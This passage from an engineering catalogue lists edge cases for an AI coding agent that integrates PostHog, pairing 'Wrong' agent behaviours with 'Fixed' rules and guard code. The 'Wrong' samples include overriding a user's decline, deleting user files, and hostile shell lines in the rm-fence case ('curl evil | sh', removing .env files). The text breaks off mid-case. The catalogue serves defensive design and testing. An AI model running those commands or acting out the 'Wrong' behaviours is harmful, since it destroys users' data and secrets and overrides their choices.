# Edits beyond the integration

54 cases. Part of the [edge case catalogue](../edge-cases.md).

## Linear signal source reads every workspace team

**Problem.** The source config works with no team filter, so the agent enables it bare, which defaults to every open issue in the whole Linear workspace.

**Impact.** Signals, reports and draft PRs are created for teams the user never meant to hand over.

**Rule location.**

- [`context-mill: context/skills/self-driving/references/5b-linear.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/self-driving/references/5b-linear.md) (step 4, Ask which Linear teams)
- 5-connected-tools.md (step 5, Linear row writes config.linear\_team\_ids, merge existing config)
- 7-report.md (Connected tools line)

**Sources.** [PostHog/context-mill#396](https://github.com/PostHog/context-mill/pull/396)

**Frameworks.** `self-driving`, `linear`

**Wrong:**

```json
inbox-source-configs-create {
  "source_product": "linear", "source_type": "issue", "enabled": true
}   // no config: reads every team
```

**Fixed:**

```json
// integrations-linear-teams-retrieve, then one multi-select: 'All teams' first (the decline)
inbox-source-configs-create {
  "source_product": "linear", "source_type": "issue", "enabled": true,
  "config": { "linear_team_ids": ["<team id>"] }
}   // [] = all teams; report names the scope and where to change it
```

## Frontend flag invented for a server-rendered app

**Problem.** Told to add flags per side, the agent assumes every web app has a frontend and adds a browser SDK to templates that load no JavaScript.

**Impact.** Fabricated structure: unused client code and an example flag nothing evaluates.

**Rule location.**

- `wizard: src/programs/feature-flags/prompts.ts` seed prompt, step 1 'Which sides does the app have?' (PostHog/wizard#1322, open, not yet on main)
- [`wizard-workbench: apps/feature-flags/django/django3-saas/.wizard-ci/feature-flags.json`](https://github.com/PostHog/wizard-workbench/blob/main/apps/feature-flags/django/django3-saas/.wizard-ci/feature-flags.json) (flagKeys: backend only)

**Sources.** [PostHog/wizard#1322](https://github.com/PostHog/wizard/pull/1322), [PostHog/wizard-workbench#4189](https://github.com/PostHog/wizard-workbench/pull/4189)

**Frameworks.** `django`, `flask`, `laravel`

**Wrong:**

```text
Django templates load no scripts
agent: adds posthog-js snippet to base.html
       + wizard-example-frontend-flag
```

**Fixed:**

```text
A side counts only when the app already has code there to put an
evaluation in. Never add a side to host a flag. Server-rendered templates
that load no JavaScript of the app's own are not a frontend: such an app
has only a backend (sides: ["backend"]) -> one flag,
wizard-example-backend-flag, one server-side evaluation.
```

## Extra recap files beyond the one report

**Problem.** Agents habitually finish by writing a SUMMARY.md or 'what was done' file next to the deliverable, unaware the skill's report is the only deliverable.

**Impact.** Orphan files clutter the user's repo and dilute the single requested deliverable.

**Rule location.** [`context-mill: context/skills/events-audit/references/5-report.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/events-audit/references/5-report.md) (line ~278, 'Surface the deliverable')

**Sources.** [PostHog/context-mill#130](https://github.com/PostHog/context-mill/pull/130), [PostHog/context-mill#129](https://github.com/PostHog/context-mill/pull/129), [PostHog/context-mill#168](https://github.com/PostHog/context-mill/pull/168)

**Frameworks.** `all`

**Wrong:**

```text
Write posthog-events-audit-report.md
Write posthog-audit-3000-report.md   # meta-summary nobody asked for
Write SUMMARY.md                     # what was done
```

**Fixed:**

```text
**Only one file is produced by this skill:** `posthog-events-audit-report.md`.
**Do not write any additional summary, recap, or "what was done" file**
(e.g. `posthog-audit-report.md`, `audit-summary.md`, `SUMMARY.md`).
Keep the end-of-turn summary in the chat reply only.
```

## Data-source step edits app files

**Problem.** Connecting a Postgres source looks related to the app's DATABASE\_URL, so a capable agent wires it into .env or db code. The per-task harness also forgot to pause file writes while the credential prompt was open, and that gap is silent.

**Impact.** Credentials can land in project files, and Write/Edit can mutate the app for up to the 20-minute ask timeout while the user types a password.

**Rule location.**

- [`context-mill: context/agents/integration-v2/warehouse.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/warehouse.md) (frontmatter)
- [`context-mill: context/skills/integration-v2/warehouse/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration-v2/warehouse/description.md) (Guiding tenet 6)
- [`wizard: src/agent/runner/harness/pi/task.ts`](https://github.com/PostHog/wizard/blob/main/src/agent/runner/harness/pi/task.ts) (askState), src/agent/runner/harness/pi/security.ts (getWizardAskPending)

**Sources.** [PostHog/wizard#1133](https://github.com/PostHog/wizard/pull/1133), [PostHog/context-mill#333](https://github.com/PostHog/context-mill/pull/333)

**Frameworks.** `all`

**Wrong:**

```ts
// per-task pi path: ask signal and fence reader never connected
createSecurityExtension({ disallowedTools })   // no getWizardAskPending
// ask tool built without onAskPendingChange
// agent meanwhile:
Write .env.local   # DATABASE_URL=postgres://app:<password>@db.acme.io/app
Edit  src/db.ts
```

**Fixed:**

```ts
# warehouse.md frontmatter
allowedTools: [Read, Glob, Grep, wizard_ask, posthog_exec]
disallowedTools: [Write, Edit, Bash, enqueue_task]
# tenet 6: 'Change no project code. This step connects external data.'
// harness (task.ts): pause Write/Edit while an ask is open
const askState = { pending: false };
createSecurityExtension({ getWizardAskPending: () => askState.pending, ... });
// ask tool: onAskPendingChange: (p) => { askState.pending = p }
```

## Offering every detected data source at once

**Problem.** Every vendor API key in .env looks like a connectable source, so the obvious move is to offer them all. Long offers fail silently because users just dismiss them.

**Impact.** Users facing a long queue of credential prompts answer none and nothing connects.

**Rule location.** [`wizard: src/programs/posthog-integration/index.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/posthog-integration/index.ts) (WAREHOUSE\_SEED\_LIMIT, warehouseSeedTasks, buildWarehouseNextSteps, WAREHOUSE\_LINK\_LIMIT)

**Sources.** [PostHog/wizard#1284](https://github.com/PostHog/wizard/pull/1284), [PostHog/wizard#1395](https://github.com/PostHog/wizard/pull/1395)

**Frameworks.** `all`

**Wrong:**

```text
seeded step input: 14 detected sources (every vendor with an API key in .env)
-> 14 credential prompts queued; user dismisses the first, nothing connects
```

**Fixed:**

```ts
const WAREHOUSE_SEED_LIMIT = 3;  // sources handed to the seeded step
const offered = sources.slice(0, WAREHOUSE_SEED_LIMIT);
// the notice names only those and says where the rest go;
// buildWarehouseNextSteps lists detected sources in the outro (up to
// WAREHOUSE_LINK_LIMIT, then 'And N more') with pre-filled links,
// whether or not the step finished done
```

## Asks credentials for data sources the app lacks

**Problem.** An over-eager detector reads a plain project as having Postgres or Stripe, and the agent goes on to ask for credentials instead of stopping.

**Impact.** The user is asked for credentials for systems the app never uses.

**Rule location.**

- [`context-mill: context/skills/data-warehouse-source/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/data-warehouse-source/description.md) (line ~70)
- [`wizard: src/programs/warehouse-source/detect.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/warehouse-source/detect.ts) (WAREHOUSE\_ABORT\_CASES)
- [`wizard-workbench: apps/warehouse/zero-source/.wizard-ci/expect.json`](https://github.com/PostHog/wizard-workbench/blob/main/apps/warehouse/zero-source/.wizard-ci/expect.json)

**Sources.** [`wizard-workbench: apps/warehouse/zero-source/README.md`](https://github.com/PostHog/wizard-workbench/blob/main/apps/warehouse/zero-source/README.md), [PostHog/wizard-workbench#3616](https://github.com/PostHog/wizard-workbench/pull/3616)

**Frameworks.** `javascript-node`

**Wrong:**

```text
link checker (only dependency: commander)
agent: "Which Postgres database should I connect?"
```

**Fixed:**

```text
If your prompt lists no detected sources, emit `[ABORT] No data source detected`
and stop.   // zero ask batches, zero creates; WAREHOUSE_ABORT_CASES matches it
// expect.json: forbidKinds lists the 6 most-hallucinated kinds, expectAbort
```

## Connects a data source after the user declined

**Problem.** The task brief says to connect the source, and the agent puts finishing the task above the Skip answer it recorded earlier.

**Impact.** The user's explicit decline is overridden and a data source is connected anyway.

**Rule location.**

- [`wizard-workbench: apps/warehouse-seeded/next-stripe-declined/.wizard-ci/expect.json`](https://github.com/PostHog/wizard-workbench/blob/main/apps/warehouse-seeded/next-stripe-declined/.wizard-ci/expect.json)
- `wizard: src/lib/agent/runner/sequence/orchestrator/queue.ts` (skip reason UserDeclined = 'user-declined'), orchestrator/\_\_tests\_\_/seeded-decline-skip.test.ts

**Sources.** [`wizard-workbench: apps/warehouse-seeded/next-stripe-declined/README.md`](https://github.com/PostHog/wizard-workbench/blob/main/apps/warehouse-seeded/next-stripe-declined/README.md), [PostHog/wizard-workbench#3616](https://github.com/PostHog/wizard-workbench/pull/3616)

**Frameworks.** `nextjs`

**Wrong:**

```text
notice: Connect Stripe to the data warehouse?  -> Skip
agent: wizard_ask(Stripe restricted key) ... external-data-sources-create
```

**Fixed:**

```json
expect.json (next-stripe-declined): notice=decline, created=[], askBatches=[0,0],
  expectSkipReason="user-declined"
// zero credential batches, zero creates in the stub journal, task ends skipped
```

## Agent turns off autocapture or session replay

**Problem.** Turning off autocapture or opting users out by default looks like tidy noise reduction or a privacy guess once custom events exist, and the loss of data is silent.

**Impact.** Pageviews, clicks, form submits and replays the user expects stop being collected with no error.

**Rule location.**

- [`context-mill: context/commandments.yaml`](https://github.com/PostHog/context-mill/blob/main/context/commandments.yaml) (javascript\_web: 'Autocapture is ON by default with posthog-js... Keep autocapture enabled unless the user explicitly asks to turn it off')
- `wizard: src/lib/agent/commandments.ts` ('Keep PostHog data capture at its defaults unless the user explicitly asks otherwise')

**Sources.** [PostHog/context-mill#173](https://github.com/PostHog/context-mill/issues/173), [PostHog/context-mill#175](https://github.com/PostHog/context-mill/issues/175), [PostHog/wizard#592](https://github.com/PostHog/wizard/issues/592), [PostHog/wizard#597](https://github.com/PostHog/wizard/pull/597), [PostHog/wizard#305](https://github.com/PostHog/wizard/pull/305), [`context-mill: example-apps/javascript-web/src/posthog.js`](https://github.com/PostHog/context-mill/blob/main/example-apps/javascript-web/src/posthog.js), [`wizard: src/agent/commandments.ts`](https://github.com/PostHog/wizard/blob/main/src/agent/commandments.ts), [PostHog/context-mill#142](https://github.com/PostHog/context-mill/pull/142), [PostHog/wizard#474](https://github.com/PostHog/wizard/pull/474), [wizard@7391ac5](https://github.com/PostHog/wizard/commit/7391ac5f6f77cd851fc020e0c6ccdcf023cad0e4), [`wizard-workbench: apps/replay-vision/README.md`](https://github.com/PostHog/wizard-workbench/blob/main/apps/replay-vision/README.md)

**Frameworks.** `javascript_web`, `react`, `nextjs`

**Wrong:**

```javascript
posthog.init(token, {
  api_host: host,
  autocapture: false,
  disable_session_recording: true,
  opt_out_capturing_by_default: true,
})
```

**Fixed:**

```javascript
posthog.init(token, {
  api_host: host,
  defaults: '2025-05-24',
  // autocapture is ON by default (clicks, form submits, pageviews): leave it
})
// runtime GDPR opt-out stays posthog.opt_out_capturing() for a real consent flow
```

## Invented wrappers the codebase never uses

**Problem.** Agents default to 'good architecture': a service class, registry or safe wrapper, even when the project and the PostHog docs call the SDK directly. Some framework guidance (the Laravel commandment) even suggests a service, which pushes toward a lazy-init wrapper.

**Impact.** Large diffs that do not match the codebase, dead helpers, init running per call path, and later steps that cannot reach the client the same way.

**Rule location.**

- [`context-mill: context/agents/integration-v2/review.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/review.md) (dimensions Minimal, Unrelated, Codebase patterns)
- [`context-mill: context/agents/integration-v2/init.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/init.md) ('How call sites reach the client is part of the shape')
- [`context-mill: context/commandments.yaml`](https://github.com/PostHog/context-mill/blob/main/context/commandments.yaml) php ('initialize once with PostHog::init()'). Note: the laravel commandment still says to create PostHogService, so it is not a clean Laravel example

**Sources.** [PostHog/context-mill#245](https://github.com/PostHog/context-mill/pull/245), [context-mill@504f57a](https://github.com/PostHog/context-mill/commit/504f57ae)

**Frameworks.** `php`, `all`

**Wrong:**

```php
class PostHogService {
  public function __construct() { PostHog::init(config('posthog.api_key'), [...]); }
}
// every controller:
$posthog = app(PostHogService::class);
$posthog->capture((string) $user->getAuthIdentifier(), 'user_logged_in');
```

**Fixed:**

```php
// init once at the app's init point; call sites use the SDK the way the docs/example do
PostHog::init($token, ['host' => $host]);
PostHog::capture(['distinctId' => (string) $user->id, 'event' => 'user_logged_in']);
// review.md: 'If a change invented a seam the project does not have — a registry, locator,
// wrapper, or app the codebase never uses — replace it with the closest pattern the
// project actually uses.'
```

## Re-run strips hand-tuned config and guards

**Problem.** On a project that already has PostHog, the agent treats it as greenfield and 'normalizes' init and identify to the doc template. It cannot tell deliberate options, comments and guards from leftovers, and the build still passes.

**Impact.** Silent regressions: ui\_host dropped while api\_host stays '/ingest', identify fires $set on every navigation, host fallbacks and rationale comments vanish.

**Rule location.**

- [`context-mill: context/skills/integration-v2/build/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration-v2/build/description.md) (Nothing was mangled)
- [`context-mill: context/agents/integration-v2/review.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/review.md) dimension 2 (Unrelated)
- [`context-mill: context/skills/integration/references/2-edit.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration/references/2-edit.md)
- wizard (main): src/agent/commandments.ts ('Before you overwrite or delete anything')
- src/rules-stubs/universal.md
- src/tui/programs/posthog-integration/intro-menu.ts (DETECTED\_HEADLINE)

**Sources.** [PostHog/wizard#1121](https://github.com/PostHog/wizard/issues/1121), [PostHog/wizard#616](https://github.com/PostHog/wizard/issues/616), [PostHog/wizard#1190](https://github.com/PostHog/wizard/pull/1190)

**Frameworks.** `nextjs`, `javascript_web`, `posthog-node`, `all`

**Wrong:**

```diff
 posthog.init(token, {
   api_host: '/ingest',
-  ui_host: 'https://us.posthog.com',
+  tracing_headers: [window.location.hostname],
 })
-    if (posthog.get_distinct_id() !== userId) {
       posthog.identify(userId, email ? { email } : undefined);
-  host: env?.X ?? process.env.X ?? "https://us.i.posthog.com",
```

**Fixed:**

```typescript
// universal.md: 'If an installation already exists, do not modify its code in any way.'
posthog.init(token, {
  api_host: '/ingest',
  ui_host: 'https://us.posthog.com',   // kept
})
// commandment: 'never drop existing code, comments, or markup to make room for a change'
// build step: 'Nothing was mangled' - restore anything deleted or reformatted
// intro: 'You can still rerun the installation, but it might overwrite some of your work.'
```

## Already-integrated project re-run without detection

**Problem.** Asked to add PostHog, an agent does not check whether it is already there and runs the full flow anyway.

**Impact.** About 8 minutes of no-op work (auth, skill install, agent run), and users bail out fearing their setup will be overwritten.

**Rule location.**

- wizard (main): src/tui/programs/posthog-integration/intro-menu.ts (DETECTED\_HEADLINE, introMenuOptions)
- src/programs/detection/integration.ts (detectExistingPostHog)

**Sources.** [PostHog/wizard#1066](https://github.com/PostHog/wizard/pull/1066), [PostHog/wizard#1190](https://github.com/PostHog/wizard/pull/1190), [PostHog/wizard#616](https://github.com/PostHog/wizard/issues/616)

**Frameworks.** `all`

**Wrong:**

```text
user: "add PostHog to my app"
agent: (no dependency check) -> installs SDK, edits init, adds captures
```

**Fixed:**

```text
detectExistingPostHog(): findPackageJsons() scan (monorepo-aware)
  -> session.posthogSdkDetected
Intro: 'It looks like PostHog is already installed. The Wizard has many tricks up its sleeve...'
       'Explore spell book' offered first, 'Continue anyway' second
```

## Second PostHog init beside the existing one

**Problem.** Setup docs always start from posthog.init or new PostHog(), so an agent asked to add a feature writes a fresh client instead of finding the one the app already has.

**Impact.** Double initialization, duplicate events, and two clients with different config and lifecycle, so existing analytics behavior changes.

**Rule location.**

- [`context-mill: context/skills/omnibus/instrument-integration/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/omnibus/instrument-integration/description.md) (line 16, existing-setup check)
- [`wizard-workbench: services/pr-evaluator/prompts/evaluation-ai-observability.md`](https://github.com/PostHog/wizard-workbench/blob/main/services/pr-evaluator/prompts/evaluation-ai-observability.md) (ph\_additive\_only)
- apps/ai-observability/manual-capture/node-http-chat/README.md (reuse the client, never a second instance)

**Sources.** [PostHog/context-mill#96](https://github.com/PostHog/context-mill/pull/96), [PostHog/wizard-workbench#3358](https://github.com/PostHog/wizard-workbench/pull/3358), [`wizard-workbench: apps/ai-observability/manual-capture/node-http-chat/README.md`](https://github.com/PostHog/wizard-workbench/blob/main/apps/ai-observability/manual-capture/node-http-chat/README.md), [PostHog/context-mill#319](https://github.com/PostHog/context-mill/pull/319), [`wizard-workbench: services/pr-evaluator/prompts/evaluation-ai-observability.md`](https://github.com/PostHog/wizard-workbench/blob/main/services/pr-evaluator/prompts/evaluation-ai-observability.md)

**Frameworks.** `node`, `posthog-js`, `posthog-node`, `all`

**Wrong:**

```typescript
// src/ai.ts
import { PostHog } from 'posthog-node'
const aiPosthog = new PostHog(process.env.POSTHOG_KEY!)  // src/posthog.ts already exports one
// or: instrumentation-client.ts already inits; agent adds another in app/providers.tsx
```

**Fixed:**

```typescript
import { posthog } from './posthog'   // reuse the existing client
// existing identify()/capture() calls and the shutdown path stay untouched
// skill: if PostHog is already installed and initialized, do not modify its code
```

## Whole-file rewrite drops existing code

**Problem.** When a targeted edit fails because the match text is not unique, rewriting the full file is the easy fallback. The model regenerates from memory and silently loses parts.

**Impact.** User code, providers, comments and markup disappear from the diff. Astro files lose their leading --- frontmatter fence, often with a syntax error.

**Rule location.**

- wizard (main): src/agent/commandments.ts ('edit it in place')
- src/agent/runner/harness/pi/security.ts#overwriteShrinkReason
- [`context-mill: context/agents/integration-v2/review.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/review.md) (dimension 2)

**Sources.** [PostHog/wizard#834](https://github.com/PostHog/wizard/pull/834), [PostHog/wizard#153](https://github.com/PostHog/wizard/issues/153), [PostHog/context-mill#245](https://github.com/PostHog/context-mill/pull/245)

**Frameworks.** `astro`, `react-native`, `all`

**Wrong:**

```text
Edit { old_string: "</body>" } -> "not unique"
Write { file_path: "src/pages/index.astro", content: <re-typed, leading --- cut off> }
write src/app/layout.tsx <rewritten file, about half the original length>
// existing ThemeProvider and AuthProvider, comments and markup dropped
```

**Fixed:**

```ts
// commandment: edit in place, add context until unique; Write only to create a file
export function overwriteShrinkReason(existing, next) {
  // existing >= 400 non-whitespace chars and the write removes > 30%
  return `This write replaces an existing file and removes ~${removed}% of its content. Make targeted edits instead...`;
}
```

## Unrelated code changed in touched files

**Problem.** While adding a provider or a metadata key, capable agents tidy nearby code (restructure props, extract helpers, change response shapes) because it looks like an improvement.

**Impact.** Invalid syntax, broken styling or changed route behavior unrelated to PostHog, which the user must find and undo.

**Rule location.**

- [`context-mill: context/skills/integration/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration/description.md) (Minimal changes, line 20)
- [`context-mill: context/skills/integration/references/2-edit.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration/references/2-edit.md) (line 23)
- [`context-mill: context/skills/revenue-analytics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/revenue-analytics/description.md) (Guiding tenet 5, Constraints)

**Sources.** [PostHog/wizard#134](https://github.com/PostHog/wizard/issues/134), [PostHog/wizard-workbench#1114](https://github.com/PostHog/wizard-workbench/pull/1114), [PostHog/context-mill#107](https://github.com/PostHog/context-mill/pull/107)

**Frameworks.** `expo`, `react-native`, `stripe-node`, `stripe-python`

**Wrong:**

```diff
// app/_layout.tsx gets PostHogProvider (fine), but the agent also edits app/index.tsx
- <View style={styles.myStyle}>
+ <View style = [styles.myStyle]>   // invalid
// backend/routes/subscriptions.ts, while adding metadata (illustrative)
-  return res.json(sub)
+  return res.status(201).json({ subscription })   // response shape changed
```

**Fixed:**

```tsx
// 'Do not alter the fundamental architecture of existing files.
//  Make your additions minimal and targeted.' / Tenet 5: never refactor unrelated code
<PostHogProvider client={posthog}>
  <Stack />   // app/index.tsx styling left exactly as it was
</PostHogProvider>
   const sub = await stripe.subscriptions.create({
     ...params, metadata: { ...params.metadata, posthog_person_distinct_id: distinctId },
   })
```

## Tutorial comments and tracking wrapper functions

**Problem.** Training data is full of tutorial snippets, so the agent adds placeholder comments, wraps functions to add tracking, and imports helpers as if the file were a demo.

**Impact.** The diff is noisy, mixes business-logic changes with analytics, and may add dependencies the project never wanted.

**Rule location.** `wizard: src/lib/agent/commandments.ts` (minimal targeted edits, edit in place, keep unrelated code). The explicit DO NOT placeholder/wrapper/new-import list existed only in the legacy src/nextjs/event-setup.ts prompt, removed in PR 214

**Sources.** [PostHog/wizard#94](https://github.com/PostHog/wizard/pull/94), [PostHog/wizard#214](https://github.com/PostHog/wizard/pull/214)

**Frameworks.** `nextjs`

**Wrong:**

```typescript
// In a real app, you would track this event
async function trackedSubmit(...args) {
  posthog.capture('submit')
  return submit(...args)
}
```

**Fixed:**

```text
'Prefer minimal, targeted edits that achieve the requested behavior while preserving existing structure and style. Avoid large refactors, broad reformatting, or unrelated changes unless explicitly requested.'
'When you change a file that already exists, edit it in place. ... Write a file in full only when you are creating it, never to modify one that already exists.'
'This integration only adds instrumentation, so keep every part of the project unrelated to PostHog exactly as it was.'
```

## Fixing build errors the change did not cause

**Problem.** A red build reads as 'my job is not done', so the agent edits untouched files, re-runs the build hoping it clears, or probes the package manager cache.

**Impact.** A slow spiral of re-runs, a large unrelated diff hiding the PostHog changes, and a task wrongly marked failed that blocks the dashboard and report steps.

**Rule location.**

- [`context-mill: context/skills/integration-v2/build/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration-v2/build/description.md) (Install, Build and verify, status paragraph)
- [`context-mill: context/skills/migrate/references/6-verify.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/migrate/references/6-verify.md) ('Fix migration induced failures only')

**Sources.** [PostHog/context-mill#181](https://github.com/PostHog/context-mill/pull/181), [PostHog/context-mill#275](https://github.com/PostHog/context-mill/pull/275), [PostHog/context-mill#142](https://github.com/PostHog/context-mill/pull/142)

**Frameworks.** `all`

**Wrong:**

```shell
npm install --offline || ls ~/.npm/_cacache
npm run build   # pre-existing TS error in src/legacy/utils.ts (untouched)
npm run build   # retry, x4
# then rewrites utils.ts and 6 other files until the build is green
```

**Fixed:**

```text
Only errors in the files this integration changed are yours to fix.
An error in a file the integration never touched is pre-existing: note it and
move on. Do not re-run build, typecheck, or lint hoping a pre-existing
failure clears. Do not poke the package manager's global store or cache.
Note the pre-existing failure in `conflict`. Only use status failed when your
own integration changes are what break the build.
```

## Review renames events and second-guesses design

**Problem.** A reviewer naturally comments on everything it sees and 'fixes' event names for consistency, identity strategy or pre-existing bugs, not knowing the dashboard and report depend on the captured contract.

**Impact.** The event contract the dashboard is built on breaks, edits land outside the integration, and findings cannot be pinned to a changed line.

**Rule location.** [`context-mill: context/agents/integration-v2/review.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/review.md) ('You never change what is captured' and 'Stay inside verify-and-review')

**Sources.** [context-mill@4431889](https://github.com/PostHog/context-mill/commit/44318898), [PostHog/context-mill#275](https://github.com/PostHog/context-mill/pull/275)

**Frameworks.** `all`

**Wrong:**

```text
- posthog.capture('Order Placed')
+ posthog.capture('order_completed')     # renamed for consistency
review handoff: 'Identity strategy for multi-tenant apps should use org ids;
also found a pre-existing N+1 in the dashboard view; fixed 14 lint errors.'
```

**Fixed:**

```text
You never change what is captured — event names, properties, and where events
fire are a contract the dashboard and report are built on.
Stay inside verify-and-review. These are not your job:
- The report or the dashboard
- Product or analytics design ... The changeset is the decision
- Anything the integration did not touch.
If you notice something real but out of scope, leave it — a one-line mention
in your handoff, no more.
```

## Parallel AI and Logs steps clobber files

**Problem.** Both tasks depend only on init, so scheduling them side by side looks correct. Both rewrite the same entry and init files, and lost edits are silent.

**Impact.** One task overwrites the other's edits, and Logs drops the tracing provider AI observability configured.

**Rule location.**

- context-mill (main): context/agents/integration-v2/logs.md (dependsOn, 'Preserve any tracing provider AIO configured')
- integrate-posthog.md (task graph notes)
- ai-observability.md (dependsOn: \[capture\])

**Sources.** [PostHog/context-mill#390](https://github.com/PostHog/context-mill/pull/390), [PostHog/context-mill#390](https://github.com/PostHog/context-mill/pull/390#discussion_r4077785692), [context-mill@e241288](https://github.com/PostHog/context-mill/commit/e2412880ed66314c50f57966ac79139af98338ae), [PostHog/wizard#1235](https://github.com/PostHog/wizard/pull/1235)

**Frameworks.** `all`

**Wrong:**

```yaml
ai-observability  dependsOn: [capture]
logs              dependsOn: [init]     # parallel, same entry file
# logs builds its own provider and drops the one AIO configured
```

**Fixed:**

```yaml
# logs.md frontmatter
dependsOn: [ai-observability]
# logs.md body: "Preserve any tracing provider AIO configured in the previous step."
# integrate-posthog.md: "These tasks run sequentially because both instrument
# the same entry and initialization files, and Logs preserves any tracing
# provider AIO configures."
```

## Wizard scratch files left in the user's repo

**Problem.** Cleanup is left to a final 'rm -f' step that the agent skips, never reaches on abort, or decides it is not allowed to run. A leftover file causes no error, so nothing flags it.

**Impact.** Untracked event plans and audit ledgers (a 3929-byte .posthog-audit-checks.json) sit in the project root, or in /tmp with env-derived data, and get committed by accident.

**Rule location.**

- [`wizard: src/agent/runner/harness/pi/index.ts`](https://github.com/PostHog/wizard/blob/main/src/agent/runner/harness/pi/index.ts)
- src/programs/run-program.ts (releaseLedger, registerCleanup)
- src/programs/audit/ledger-watcher.ts (removeAuditLedger)
- src/host/wizard-abort.ts

**Sources.** [PostHog/wizard#1336](https://github.com/PostHog/wizard/pull/1336), [PostHog/wizard#1326](https://github.com/PostHog/wizard/issues/1326), [PostHog/wizard#894](https://github.com/PostHog/wizard/issues/894), [PostHog/wizard#612](https://github.com/PostHog/wizard/issues/612), [PostHog/wizard#1354](https://github.com/PostHog/wizard/issues/1354)

**Frameworks.** `all`

**Wrong:**

```shell
$ git status --short
?? .posthog-events.json
?? .posthog-audit-checks.json   # agent never ran rm -f
?? .posthog-wizard/skills/
# /tmp/posthog-remediation-env.json survives an [ABORT]
```

**Fixed:**

```typescript
// host-side: a skipped agent step leaves nothing
const planFile = path.join(input.installDir, '.posthog-events.json');
if (!structured && fs.existsSync(planFile)) await fs.promises.rm(planFile);
// run-program.ts: ledger removed on success, thrown run, and wizardAbort
removeAuditLedger(installDir, ledgerFile);
// run artifacts live in .posthog-wizard-cache/, wiped on success or failure
```

## Wizard workflow files left in user's project

**Problem.** Skills and run state are written to .claude/skills or a project folder because that is where the SDK finds them, and cleanup only runs on the success path.

**Impact.** The user's own coding agent later auto-loads the wizard's step files and COMMANDMENTS as if they were project docs, and the scaffolding shows up in CI-generated PRs and survives aborts.

**Rule location.**

- [`wizard: src/agent/runner/sequence/orchestrator/queue.ts`](https://github.com/PostHog/wizard/blob/main/src/agent/runner/sequence/orchestrator/queue.ts) (QUEUE\_DIR\_NAME, DELETE\_ME\_FILE)
- src/agent/runner/sequence/orchestrator/orchestrator-runner.ts (promoteReferenceSkill, sweepRunInstalledSkills, isDocPage, cleanupQueue)

**Sources.** [PostHog/wizard#637](https://github.com/PostHog/wizard/pull/637), [PostHog/wizard#677](https://github.com/PostHog/wizard/pull/677), [PostHog/wizard#950](https://github.com/PostHog/wizard/pull/950)

**Frameworks.** `all`

**Wrong:**

```text
.claude/skills/integration-django/
  SKILL.md                       <- agent workflow
  references/1-begin.md ... 4-conclude.md
  references/COMMANDMENTS.md, EXAMPLE.md
.posthog-wizard/queue.json       <- cleaned only in postRun
```

**Fixed:**

```typescript
// run state lives in .posthog-wizard-cache/ (QUEUE_DIR_NAME), wiped on success or failure
cleanupQueue();   // rmSync(installDir/QUEUE_DIR_NAME, { recursive, force })
sweepRunInstalledSkills(claudeSkillsDir, preexistingSkills, referenceSkillId); // wizard-marked, new this run
// kept skills are docs pages only
const isDocPage = (n) => n.endsWith('.md') && n === n.toLowerCase() && !/^\d/.test(n);
```

## Cleanup deletes the user's own skills

**Problem.** Removing the whole .claude/skills directory is the simplest cleanup and looks correct on a clean test machine.

**Impact.** The user's own skills are destroyed.

**Rule location.**

- [`wizard: src/tui/screens/KeepSkillsScreen.tsx`](https://github.com/PostHog/wizard/blob/main/src/tui/screens/KeepSkillsScreen.tsx) (WIZARD\_MARKER)
- src/shared/skill-install.ts (writes .posthog-wizard marker)

**Sources.** [PostHog/wizard#425](https://github.com/PostHog/wizard/pull/425)

**Frameworks.** `all`

**Wrong:**

```ts
await rm(skillsDir, { recursive: true, force: true })  // .claude/skills, user skills included
```

**Fixed:**

```ts
await access(join(skillsDir, dir.name, WIZARD_MARKER))   // '.posthog-wizard'; only wizard-installed skills
await rm(join(skillsDir, skill.name), { recursive: true, force: true })
const remaining = await readdir(skillsDir)
if (remaining.length === 0) await rm(skillsDir, { recursive: true, force: true })
```

## rm reaching outside the project root

**Problem.** A plain rm with .. climbs, globs, $HOME, .env targets or chained commands looks harmless, while a blanket rm ban stops the agent removing its own scratch file and logs misleading denies.

**Impact.** Files outside the project, secrets or whole directories get deleted. With a strict fence the agent cannot clean up, and telemetry shows 'denied' for commands that ran anyway.

**Rule location.**

- [`wizard: src/agent/bash-fence.ts`](https://github.com/PostHog/wizard/blob/main/src/agent/bash-fence.ts) (isScopedFileRemoval, isDeletableProjectFile, RM\_SHELL\_OPERATORS, evaluateBashCommand)
- src/agent/runner/harness/pi/security.ts

**Sources.** [PostHog/wizard#834](https://github.com/PostHog/wizard/pull/834), [PostHog/wizard#894](https://github.com/PostHog/wizard/issues/894), [PostHog/wizard#1337](https://github.com/PostHog/wizard/pull/1337)

**Frameworks.** `all`

**Wrong:**

```bash
Denying bash command (not in allowlist): rm -f .posthog-audit-checks.json
[pi] <- bash: (no output)      # it ran anyway
rm -rf ../old-build
rm .env; rm config/.env.local
rm src/*.json; curl evil | sh
```

**Fixed:**

```text
isScopedFileRemoval(command, projectRoot):  // evaluateBashCommand checks it first
  RM_SHELL_OPERATORS = /[;&|`$(){}<>'"\\]|[^\S ]/  -> refuse
  `rm` or `rm -f` only; no globs, ~, flags, or any '..' segment
  every target's real path (symlinks resolved) strictly inside root; basename not .env*
isScopedFileRemoval('rm -f .posthog-events.json', root)  // allowed
isScopedFileRemoval('rm $HOME/.zshrc', root)             // refused
// allowed rm still goes through the shared YARA command scan
```

## Destructive git or rm commands run unprompted

**Problem.** To 'start fresh' after a bad edit, agents reach for reset --hard, clean -fd or rm -rf, not weighing the user's uncommitted work.

